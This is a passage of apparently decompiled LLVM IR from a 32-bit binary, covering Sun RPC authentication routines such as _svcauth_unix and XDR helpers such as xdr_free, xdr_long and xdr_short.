dec_label_pc_80643a8:                             ; preds = %dec_label_pc_8064386
  %v1_80643a8 = add i32 %v0_806438b, 1
  br label %dec_label_pc_80643a9

dec_label_pc_80643a9:                             ; preds = %dec_label_pc_8064382, %dec_label_pc_80643a8
  %storemerge = phi i32 [ 0, %dec_label_pc_8064382 ], [ %v1_80643a8, %dec_label_pc_80643a8 ]
  store i32 %storemerge, i32* @ebx, align 4
  %v0_80643a9 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_80643a9, i32* %eax.global-to-local, align 4
  store i32 %v0_80643a9, i32* @esi, align 4
  %v1_80643b0 = inttoptr i32 %v0_80643a9 to i32*
  %v2_80643b0 = load i32, i32* %v1_80643b0, align 4
  store i32 %v2_80643b0, i32* %eax.global-to-local, align 4
  %v0_80643b2 = load i32, i32* @ebx, align 4
  %v5_80643b4 = icmp slt i32 %v0_80643b2, %v2_80643b0
  br i1 %v5_80643b4, label %dec_label_pc_8064386, label %dec_label_pc_80643b6

dec_label_pc_80643b6:                             ; preds = %dec_label_pc_80643a9
  %v1_80643b6 = add i32 %v2_80643b0, 1
  store i32 %v1_80643b6, i32* %eax.global-to-local, align 4
  store i32 %v1_80643b6, i32* %v1_80643b0, align 4
  %v0_80643b9 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_80643b9, i32* %eax.global-to-local, align 4
  store i32 %v0_80643b9, i32* @ebx, align 4
  %v0_80643c2 = load i32, i32* @esi, align 4
  %v1_80643c2 = inttoptr i32 %v0_80643c2 to i32*
  %v2_80643c2 = load i32, i32* %v1_80643c2, align 4
  %v2_80643c4 = mul i32 %v2_80643c2, 8
  store i32 %v2_80643c4, i32* %eax.global-to-local, align 4
  store i32 %v2_80643c4, i32* %stack_var_-24, align 4
  %v1_80643c8 = inttoptr i32 %v0_80643b9 to i32*
  %v2_80643c8 = load i32, i32* %v1_80643c8, align 4
  store i32 %v2_80643c8, i32* %stack_var_-28, align 4
  %v4_80643ca = inttoptr i32 %v2_80643c8 to i32*
  %v5_80643ca = call i32 @realloc(i32* %v4_80643ca, i32 %v2_80643c4, i32 %v0_80643b9, i32 %v0_80643b9)
  store i32 %v5_80643ca, i32* %eax.global-to-local, align 4
  %v1_80643d2 = icmp eq i32 %v5_80643ca, 0
  store i32 %v5_80643ca, i32* %edx.global-to-local, align 4
  %v1_80643d6 = load i32, i32* @ebx, align 4
  %v2_80643d6 = inttoptr i32 %v1_80643d6 to i32*
  store i32 %v5_80643ca, i32* %v2_80643d6, align 4
  br i1 %v1_80643d2, label %dec_label_pc_80643eb, label %dec_label_pc_80643da

dec_label_pc_80643da:                             ; preds = %dec_label_pc_80643b6
  %v0_80643da = load i32, i32* @esi, align 4
  %v1_80643da = inttoptr i32 %v0_80643da to i32*
  %v2_80643da = load i32, i32* %v1_80643da, align 4
  store i32 %v2_80643da, i32* %eax.global-to-local, align 4
  %v0_80643dc = load i32, i32* @edi, align 4
  %v1_80643dc = load i32, i32* %edx.global-to-local, align 4
  %v3_80643dc = mul i32 %v2_80643da, 8
  %v4_80643dc = add i32 %v3_80643dc, -8
  %v5_80643dc = add i32 %v4_80643dc, %v1_80643dc
  %v6_80643dc = inttoptr i32 %v5_80643dc to i32*
  store i32 %v0_80643dc, i32* %v6_80643dc, align 4
  %v0_80643e0 = load i32, i32* @esi, align 4
  %v1_80643e0 = inttoptr i32 %v0_80643e0 to i32*
  %v2_80643e0 = load i32, i32* %v1_80643e0, align 4
  store i32 %v2_80643e0, i32* %edx.global-to-local, align 4
  %v0_80643e2 = load i32, i32* @ebx, align 4
  %v1_80643e2 = inttoptr i32 %v0_80643e2 to i32*
  %v2_80643e2 = load i32, i32* %v1_80643e2, align 4
  store i32 %v2_80643e2, i32* %eax.global-to-local, align 4
  %v2_80643e4 = mul i32 %v2_80643e0, 8
  %v3_80643e4 = add i32 %v2_80643e4, -4
  %v4_80643e4 = add i32 %v3_80643e4, %v2_80643e2
  %v5_80643e4 = inttoptr i32 %v4_80643e4 to i16*
  store i16 195, i16* %v5_80643e4, align 2
  br label %dec_label_pc_80643eb

dec_label_pc_80643eb:                             ; preds = %dec_label_pc_8064351, %dec_label_pc_80643b6, %dec_label_pc_806432f, %dec_label_pc_806439b, %dec_label_pc_80643da
  %v0_80643ee = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80643ee

; uselistorder directives
  uselistorder i32 %v5_80643ca, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80643c4, { 2, 1, 0 }
  uselistorder i32 %v1_806437b, { 1, 0 }
  uselistorder i32 %v2_8064378, { 1, 0 }
  uselistorder i32 %v0_8064374, { 1, 0 }
  uselistorder i32 %v1_8064364, { 1, 0 }
  uselistorder i32 %v0_8064356, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8064337, { 2, 1, 0 }
  uselistorder i32* %stack_var_-24, { 2, 0, 1 }
  uselistorder i32* %stack_var_-28, { 2, 0, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 13, 0, 1, 2, 3, 7, 4, 8, 5, 6, 9, 10, 11, 12, 14, 15, 16 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 2, 1, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 ()* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 1022, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @_rpc_dtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80643eb, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_80643a9, { 1, 0 }
  uselistorder label %dec_label_pc_8064382, { 1, 0 }
}

define i32 @_authenticate() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80643f1 = load i32, i32* @ebx, align 4
  store i32 %v0_80643f1, i32* %stack_var_-8, align 4
  store i32 %tmp1, i32* @esi, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v1_80643ff = add i32 %tmp1, 24
  %v1_8064402 = add i32 %tmp, 12
  %v3_8064407 = inttoptr i32 %v1_8064402 to i16*
  %v4_8064407 = call i32 @memcpy(i16* %v3_8064407, i32 %v1_80643ff, i32 12)
  %v1_806440c = add i32 %tmp, 28
  %v2_806440c = inttoptr i32 %v1_806440c to i32*
  %v3_806440c = load i32, i32* %v2_806440c, align 4
  %v0_8064412 = load i32, i32* @global_var_807f800.744, align 2048
  %v2_8064417 = add i32 %v3_806440c, 32
  %v3_8064417 = inttoptr i32 %v2_8064417 to i32*
  store i32 %v0_8064412, i32* %v3_8064417, align 4
  %v0_806441a = load i32, i32* %ebx.global-to-local, align 4
  %v1_806441a = add i32 %v0_806441a, 28
  %v2_806441a = inttoptr i32 %v1_806441a to i32*
  %v3_806441a = load i32, i32* %v2_806441a, align 4
  %v1_806441d = add i32 %v3_806441a, 40
  %v2_806441d = inttoptr i32 %v1_806441d to i32*
  store i32 0, i32* %v2_806441d, align 4
  %v0_8064424 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064424 = add i32 %v0_8064424, 12
  %v2_8064424 = inttoptr i32 %v1_8064424 to i32*
  %v3_8064424 = load i32, i32* %v2_8064424, align 4
  %v1_8064430 = mul i32 %v3_8064424, 4
  %v2_8064430 = add i32 %v1_8064430, ptrtoint (i32* @global_var_806efd8.754 to i32)
  %v3_8064430 = inttoptr i32 %v2_8064430 to i32*
  %v4_8064430 = load i32, i32* %v3_8064430, align 4
  %v2_806443c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_806443c, i32* %ebx.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_8064430)
  %v2_8064440 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8064440, i32* @edx, align 4
  store i32 %v2_806443c, i32* @ebx, align 4
  ret i32 2

; uselistorder directives
  uselistorder i32 %tmp1, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8064453 = load i32, i32* @edi, align 4
  %v0_8064455 = load i32, i32* @ebx, align 4
  store i32 %v0_8064455, i32* %stack_var_-16, align 4
  %v1_806445d = add i32 %arg2, 24
  %v2_806445d = inttoptr i32 %v1_806445d to i32*
  %v3_806445d = load i32, i32* %v2_806445d, align 4
  store i32 %v3_806445d, i32* @edi, align 4
  %v1_8064460 = add i32 %v3_806445d, 24
  %v2_8064463 = add i32 %v3_806445d, 4
  %v3_8064463 = inttoptr i32 %v2_8064463 to i32*
  store i32 %v1_8064460, i32* %v3_8064463, align 4
  %v0_8064466 = load i32, i32* @edi, align 4
  %v1_8064466 = add i32 %v0_8064466, 280
  %v2_806446c = add i32 %v0_8064466, 20
  %v3_806446c = inttoptr i32 %v2_806446c to i32*
  store i32 %v1_8064466, i32* %v3_806446c, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_8064473 = add i32 %arg3, 32
  %v2_8064473 = inttoptr i32 %v1_8064473 to i32*
  %v3_8064473 = load i32, i32* %v2_8064473, align 4
  store i32 %v3_8064473, i32* %edx.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v1_8064481 = add i32 %arg3, 28
  %v2_8064481 = inttoptr i32 %v1_8064481 to i32*
  %v3_8064481 = load i32, i32* %v2_8064481, align 4
  %v2_8064484 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_8064484, i32* @ebx, align 4
  %v5_8064489 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-40, i32 %v3_8064481, i32 %v3_8064473, i32 1)
  store i32 %v2_8064484, i32* @esi, align 4
  store i32 %v3_8064481, i32* @ebp, align 4
  store i32 %tmp7, i32* @eax, align 4
  %v7_8064499 = add i32 %tmp7, 24
  %v8_8064499 = inttoptr i32 %v7_8064499 to i32*
  %v9_8064499 = load i32, i32* %v8_8064499, align 4
  call void @__pseudo_call(i32 %v9_8064499)
  %v1_806449f = icmp eq i32 %tmp7, 0
  store i32 %tmp7, i32* %edx.global-to-local, align 4
  br i1 %v1_806449f, label %dec_label_pc_8064536, label %dec_label_pc_80644a9

dec_label_pc_80644a9:                             ; preds = %entry
  %v1_80644a9 = inttoptr i32 %tmp7 to i32*
  %v2_80644a9 = load i32, i32* %v1_80644a9, align 4
  %v1_80644ab = call i32 @llvm.bswap.i32(i32 %v2_80644a9)
  %v1_80644ad = load i32, i32* @edi, align 4
  %v2_80644ad = inttoptr i32 %v1_80644ad to i32*
  store i32 %v1_80644ab, i32* %v2_80644ad, align 4
  %v0_80644af = load i32, i32* %edx.global-to-local, align 4
  %v1_80644af = add i32 %v0_80644af, 4
  %v2_80644af = inttoptr i32 %v1_80644af to i32*
  %v3_80644af = load i32, i32* %v2_80644af, align 4
  %v1_80644b2 = call i32 @llvm.bswap.i32(i32 %v3_80644af)
  store i32 %v1_80644b2, i32* @esi, align 4
  %v6_80644ba = icmp ugt i32 %v1_80644b2, 255
  br i1 %v6_80644ba, label %dec_label_pc_80645b3, label %dec_label_pc_80644c0

dec_label_pc_80644c0:                             ; preds = %dec_label_pc_80644a9
  %v1_80644c2 = add i32 %v0_80644af, 8
  store i32 %v1_80644c2, i32* %ebx.global-to-local, align 4
  %v0_80644c6 = load i32, i32* @edi, align 4
  %v1_80644c6 = add i32 %v0_80644c6, 4
  %v2_80644c6 = inttoptr i32 %v1_80644c6 to i32*
  %v3_80644c6 = load i32, i32* %v2_80644c6, align 4
  %v1_80644c9 = add i32 %v1_80644b2, 3
  %v1_80644cc = and i32 %v1_80644c9, -4
  store i32 %v1_80644cc, i32* %ebp.global-to-local, align 4
  %tmp25 = inttoptr i32 %v3_80644c6 to i16*
  %v5_80644cf = call i32 @memcpy(i16* %tmp25, i32 %v1_80644c2, i32 %v1_80644b2)
  %v0_80644d4 = load i32, i32* @edi, align 4
  %v1_80644d4 = add i32 %v0_80644d4, 4
  %v2_80644d4 = inttoptr i32 %v1_80644d4 to i32*
  %v3_80644d4 = load i32, i32* %v2_80644d4, align 4
  %v0_80644d7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80644d7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80644d7 = add i32 %v1_80644d7, %v0_80644d7
  store i32 %v2_80644d7, i32* %edx.global-to-local, align 4
  %v2_80644dd = add i32 %v3_80644d4, %v1_80644b2
  %v3_80644dd = inttoptr i32 %v2_80644dd to i8*
  store i8 0, i8* %v3_80644dd, align 1
  %v0_80644e1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80644e1 = inttoptr i32 %v0_80644e1 to i32*
  %v2_80644e1 = load i32, i32* %v1_80644e1, align 4
  %v1_80644e3 = call i32 @llvm.bswap.i32(i32 %v2_80644e1)
  %v1_80644e5 = load i32, i32* @edi, align 4
  %v2_80644e5 = add i32 %v1_80644e5, 8
  %v3_80644e5 = inttoptr i32 %v2_80644e5 to i32*
  store i32 %v1_80644e3, i32* %v3_80644e5, align 4
  %v0_80644e8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80644e8 = add i32 %v0_80644e8, 4
  %v2_80644e8 = inttoptr i32 %v1_80644e8 to i32*
  %v3_80644e8 = load i32, i32* %v2_80644e8, align 4
  %v1_80644eb = call i32 @llvm.bswap.i32(i32 %v3_80644e8)
  %v1_80644ed = load i32, i32* @edi, align 4
  %v2_80644ed = add i32 %v1_80644ed, 12
  %v3_80644ed = inttoptr i32 %v2_80644ed to i32*
  store i32 %v1_80644eb, i32* %v3_80644ed, align 4
  %v0_80644f0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80644f0 = add i32 %v0_80644f0, 8
  %v2_80644f0 = inttoptr i32 %v1_80644f0 to i32*
  %v3_80644f0 = load i32, i32* %v2_80644f0, align 4
  %v1_80644f3 = call i32 @llvm.bswap.i32(i32 %v3_80644f0)
  store i32 %v1_80644f3, i32* %ecx.global-to-local, align 4
  %v6_80644f8 = icmp ugt i32 %v1_80644f3, 16
  br i1 %v6_80644f8, label %dec_label_pc_80645b3, label %dec_label_pc_80644fe

dec_label_pc_80644fe:                             ; preds = %dec_label_pc_80644c0
  %v1_80644fe = add i32 %v0_80644f0, 12
  store i32 %v1_80644fe, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v1_8064503 = load i32, i32* @edi, align 4
  %v2_8064503 = add i32 %v1_8064503, 16
  %v3_8064503 = inttoptr i32 %v2_8064503 to i32*
  store i32 %v1_80644f3, i32* %v3_8064503, align 4
  %v0_8064516.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_806451628 = icmp ult i32 %v0_8064516.pre, %v1_80644f3
  br i1 %v7_806451628, label %dec_label_pc_8064508, label %dec_label_pc_806451a

dec_label_pc_8064508:                             ; preds = %dec_label_pc_80644fe, %dec_label_pc_8064508
  %v2_806451229 = phi i32 [ %v1_8064515, %dec_label_pc_8064508 ], [ %v0_8064516.pre, %dec_label_pc_80644fe ]
  %v0_8064508 = load i32, i32* @edi, align 4
  %v1_8064508 = add i32 %v0_8064508, 20
  %v2_8064508 = inttoptr i32 %v1_8064508 to i32*
  %v3_8064508 = load i32, i32* %v2_8064508, align 4
  store i32 %v3_8064508, i32* %edx.global-to-local, align 4
  %v0_806450b = load i32, i32* %ebx.global-to-local, align 4
  %v1_806450b = inttoptr i32 %v0_806450b to i32*
  %v2_806450b = load i32, i32* %v1_806450b, align 4
  %v1_806450d = add i32 %v0_806450b, 4
  store i32 %v1_806450d, i32* %ebx.global-to-local, align 4
  %v1_8064510 = call i32 @llvm.bswap.i32(i32 %v2_806450b)
  %v3_8064512 = mul i32 %v2_806451229, 4
  %v4_8064512 = add i32 %v3_8064508, %v3_8064512
  %v5_8064512 = inttoptr i32 %v4_8064512 to i32*
  store i32 %v1_8064510, i32* %v5_8064512, align 4
  %v0_8064515 = load i32, i32* %esi.global-to-local, align 4
  %v1_8064515 = add i32 %v0_8064515, 1
  store i32 %v1_8064515, i32* %esi.global-to-local, align 4
  %v7_8064516 = icmp ult i32 %v1_8064515, %v1_80644f3
  br i1 %v7_8064516, label %dec_label_pc_8064508, label %dec_label_pc_806451a

dec_label_pc_806451a:                             ; preds = %dec_label_pc_8064508, %dec_label_pc_80644fe
  %v0_806451a = load i32, i32* %ebp.global-to-local, align 4
  %v2_806451a = mul i32 %v1_80644f3, 4
  %v3_806451a = add i32 %v2_806451a, 20
  %v4_806451a = add i32 %v3_806451a, %v0_806451a
  %tmp = icmp ugt i32 %v4_806451a, %tmp6
  br i1 %tmp, label %dec_label_pc_8064524, label %dec_label_pc_8064561

dec_label_pc_8064524:                             ; preds = %dec_label_pc_806451a
  %v6_806452f = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_806efe4.755, i32 0, i32 0), i32 %v1_80644f3, i32 %v0_806451a, i32 %tmp6)
  br label %dec_label_pc_8064557

dec_label_pc_8064536:                             ; preds = %entry
  %v0_8064538 = load i32, i32* @edi, align 4
  %v6_806453a = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-40, i32 %v0_8064538, i32 0, i32 0)
  store i32 %v6_806453a, i32* @eax, align 4
  %v1_8064542 = icmp eq i32 %v6_806453a, 0
  %v1_8064544 = icmp eq i1 %v1_8064542, false
  br i1 %v1_8064544, label %dec_label_pc_8064561, label %dec_label_pc_8064546

dec_label_pc_8064546:                             ; preds = %dec_label_pc_8064536
  %v0_8064550 = load i32, i32* @edi, align 4
  %v6_8064552 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-40, i32 %v0_8064550, i32 %v6_806453a, i32 %v6_806453a)
  br label %dec_label_pc_8064557

dec_label_pc_8064557:                             ; preds = %dec_label_pc_8064524, %dec_label_pc_8064546
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80645b8

dec_label_pc_8064561:                             ; preds = %dec_label_pc_806451a, %dec_label_pc_8064536
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8064569 = add i32 %arg2, 44
  %v2_8064569 = inttoptr i32 %v1_8064569 to i32*
  %v3_8064569 = load i32, i32* %v2_8064569, align 4
  %v4_8064569 = icmp eq i32 %v3_8064569, 0
  %v1_806456d = add i32 %arg1, 28
  %v2_806456d = inttoptr i32 %v1_806456d to i32*
  %v3_806456d = load i32, i32* %v2_806456d, align 4
  store i32 %v3_806456d, i32* %edx.global-to-local, align 4
  br i1 %v4_8064569, label %dec_label_pc_806459a, label %dec_label_pc_8064572

dec_label_pc_8064572:                             ; preds = %dec_label_pc_8064561
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  %v1_8064574 = add i32 %arg2, 36
  %v2_8064574 = inttoptr i32 %v1_8064574 to i32*
  %v3_8064574 = load i32, i32* %v2_8064574, align 4
  %v2_8064577 = add i32 %v3_806456d, 32
  %v3_8064577 = inttoptr i32 %v2_8064577 to i32*
  store i32 %v3_8064574, i32* %v3_8064577, align 4
  %v3_806457e = load i32, i32* %v2_806456d, align 4
  store i32 %v3_806457e, i32* %edx.global-to-local, align 4
  %v0_8064581 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8064581 = add i32 %v0_8064581, 40
  %v2_8064581 = inttoptr i32 %v1_8064581 to i32*
  %v3_8064581 = load i32, i32* %v2_8064581, align 4
  %v2_8064584 = add i32 %v3_806457e, 36
  %v3_8064584 = inttoptr i32 %v2_8064584 to i32*
  store i32 %v3_8064581, i32* %v3_8064584, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v3_806458b = load i32, i32* %v2_806456d, align 4
  store i32 %v3_806458b, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  %v3_8064592 = load i32, i32* %v2_8064569, align 4
  %v2_8064595 = add i32 %v3_806458b, 40
  %v3_8064595 = inttoptr i32 %v2_8064595 to i32*
  store i32 %v3_8064592, i32* %v3_8064595, align 4
  br label %dec_label_pc_80645af

dec_label_pc_806459a:                             ; preds = %dec_label_pc_8064561
  %v1_806459a = add i32 %v3_806456d, 32
  %v2_806459a = inttoptr i32 %v1_806459a to i32*
  store i32 0, i32* %v2_806459a, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v3_80645a5 = load i32, i32* %v2_806456d, align 4
  %v1_80645a8 = add i32 %v3_80645a5, 40
  %v2_80645a8 = inttoptr i32 %v1_80645a8 to i32*
  store i32 0, i32* %v2_80645a8, align 4
  br label %dec_label_pc_80645af

dec_label_pc_80645af:                             ; preds = %dec_label_pc_8064572, %dec_label_pc_806459a
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80645b8

dec_label_pc_80645b3:                             ; preds = %dec_label_pc_80644c0, %dec_label_pc_80644a9
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80645b8

dec_label_pc_80645b8:                             ; preds = %dec_label_pc_80645af, %dec_label_pc_8064557, %dec_label_pc_80645b3
  %v0_80645d35 = phi i32 [ 0, %dec_label_pc_80645af ], [ 1, %dec_label_pc_8064557 ], [ 1, %dec_label_pc_80645b3 ]
  %v3_80645b8 = load i32, i32* %stack_var_-40, align 4
  %v1_80645bc = add i32 %v3_80645b8, 28
  %v2_80645bc = inttoptr i32 %v1_80645bc to i32*
  %v3_80645bc = load i32, i32* %v2_80645bc, align 4
  store i32 %v3_80645bc, i32* %edx.global-to-local, align 4
  %v1_80645bf = icmp eq i32 %v3_80645bc, 0
  br i1 %v1_80645bf, label %dec_label_pc_80645d0, label %dec_label_pc_80645c3

dec_label_pc_80645c3:                             ; preds = %dec_label_pc_80645b8
  call void @__pseudo_call(i32 %v3_80645bc)
  %v0_80645d3.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80645d0

dec_label_pc_80645d0:                             ; preds = %dec_label_pc_80645b8, %dec_label_pc_80645c3
  %v0_80645d3 = phi i32 [ %v0_80645d3.pre, %dec_label_pc_80645c3 ], [ %v0_80645d35, %dec_label_pc_80645b8 ]
  %v2_80645d6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80645d6, i32* %esi.global-to-local, align 4
  store i32 %v0_8064453, i32* %ebp.global-to-local, align 4
  ret i32 %v0_80645d3

; uselistorder directives
  uselistorder i32 %v3_806456d, { 1, 0, 2 }
  uselistorder i32* %v2_806456d, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8064515, { 1, 2, 0 }
  uselistorder i32 %v1_80644f3, { 1, 2, 4, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-40, { 3, 0, 1, 2, 4 }
  uselistorder i32 %tmp7, { 2, 0, 1, 4, 3 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 4, 2, 5, 6 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_80645d0, { 1, 0 }
  uselistorder label %dec_label_pc_80645b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80645af, { 1, 0 }
  uselistorder label %dec_label_pc_8064561, { 1, 0 }
  uselistorder label %dec_label_pc_8064557, { 1, 0 }
  uselistorder label %dec_label_pc_8064508, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 2, i32* %stack_var_-24, align 4
  %v2_80645eb = ptrtoint i32* %stack_var_-24 to i32
  %v1_80645f0 = call i32 @unknown_0(i32 %v2_80645eb)
  ret i32 %v1_80645f0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 4, 3, 2, 1, 0 }
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_8064606 = inttoptr i32 %tmp2 to i32*
  %v2_8064606 = load i32, i32* %v1_8064606, align 4
  store i32 %v2_8064606, i32* %eax.global-to-local, align 4
  %v1_8064608 = icmp eq i32 %v2_8064606, 0
  %v1_806460a = icmp eq i1 %v1_8064608, false
  br i1 %v1_806460a, label %dec_label_pc_8064614, label %dec_label_pc_806460c

dec_label_pc_806460c:                             ; preds = %entry
  %v1_806460c = add i32 %tmp2, 4
  %v2_806460c = inttoptr i32 %v1_806460c to i32*
  %v3_806460c = load i32, i32* %v2_806460c, align 4
  store i32 %v3_806460c, i32* %eax.global-to-local, align 4
  %v1_806460f = add i32 %v3_806460c, 4
  br label %dec_label_pc_8064626

dec_label_pc_8064614:                             ; preds = %entry
  %v9_8064614 = icmp eq i32 %v2_8064606, 1
  %v1_8064617 = icmp eq i1 %v9_8064614, false
  br i1 %v1_8064617, label %dec_label_pc_8064628, label %dec_label_pc_8064619

dec_label_pc_8064619:                             ; preds = %dec_label_pc_8064614
  %v1_8064619 = add i32 %tmp2, 4
  %v2_8064619 = inttoptr i32 %v1_8064619 to i32*
  %v3_8064619 = load i32, i32* %v2_8064619, align 4
  store i32 %v3_8064619, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064626

dec_label_pc_8064626:                             ; preds = %dec_label_pc_806460c, %dec_label_pc_8064619
  %storemerge.in.in = phi i32 [ %v1_806460f, %dec_label_pc_806460c ], [ %v3_8064619, %dec_label_pc_8064619 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @ecx, align 4
  call void @__pseudo_branch(i32 %storemerge)
  %v0_8064628.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064628

dec_label_pc_8064628:                             ; preds = %dec_label_pc_8064614, %dec_label_pc_8064626
  %v0_8064628 = phi i32 [ %v2_8064606, %dec_label_pc_8064614 ], [ %v0_8064628.pre, %dec_label_pc_8064626 ]
  %v9_8064628 = icmp eq i32 %v0_8064628, 2
  %v1_806462b = zext i1 %v9_8064628 to i32
  store i32 %v1_806462b, i32* %eax.global-to-local, align 4
  ret i32 %v1_806462b

; uselistorder directives
  uselistorder i32 %v2_8064606, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_8064628, { 1, 0 }
  uselistorder label %dec_label_pc_8064626, { 1, 0 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_806463e = load i32, i32* %arg1, align 4
  %v9_8064640 = icmp eq i32 %v2_806463e, 1
  br i1 %v9_8064640, label %dec_label_pc_806466d, label %dec_label_pc_8064645

dec_label_pc_8064645:                             ; preds = %entry
  %v5_8064640 = icmp eq i32 %v2_806463e, 0
  br i1 %v5_8064640, label %dec_label_pc_8064653, label %dec_label_pc_8064647

dec_label_pc_8064647:                             ; preds = %dec_label_pc_8064645
  %v9_8064647 = icmp eq i32 %v2_806463e, 2
  br i1 %v9_8064647, label %dec_label_pc_8064691, label %dec_label_pc_806468f

dec_label_pc_8064653:                             ; preds = %dec_label_pc_8064645
  %v1_8064653 = inttoptr i32 %arg2 to i16*
  %v2_8064653 = load i16, i16* %v1_8064653, align 2
  %v3_8064653 = sext i16 %v2_8064653 to i32
  store i32 %v3_8064653, i32* %stack_var_-8, align 4
  %v1_806465c = add i32 %tmp8, 4
  %v2_806465c = inttoptr i32 %v1_806465c to i32*
  %v3_806465c = load i32, i32* %v2_806465c, align 4
  %v2_806465f = ptrtoint i32* %stack_var_-8 to i32
  %v5_8064665 = add i32 %v3_806465c, 4
  %v6_8064665 = inttoptr i32 %v5_8064665 to i32*
  %v7_8064665 = load i32, i32* %v6_8064665, align 4
  call void @__pseudo_call(i32 %v7_8064665)
  br label %dec_label_pc_8064691

dec_label_pc_806466d:                             ; preds = %entry
  %v1_806466f = add i32 %tmp8, 4
  %v2_806466f = inttoptr i32 %v1_806466f to i32*
  %v3_806466f = load i32, i32* %v2_806466f, align 4
  %v5_8064678 = inttoptr i32 %v3_806466f to i32*
  %v6_8064678 = load i32, i32* %v5_8064678, align 4
  call void @__pseudo_call(i32 %v6_8064678)
  %v1_806467d = icmp eq i32 %v3_806466f, 0
  br i1 %v1_806467d, label %dec_label_pc_806468f, label %dec_label_pc_8064681

dec_label_pc_8064681:                             ; preds = %dec_label_pc_806466d
  %v2_8064685 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8064685 = inttoptr i32 %v2_8064685 to i16*
  br label %dec_label_pc_8064691

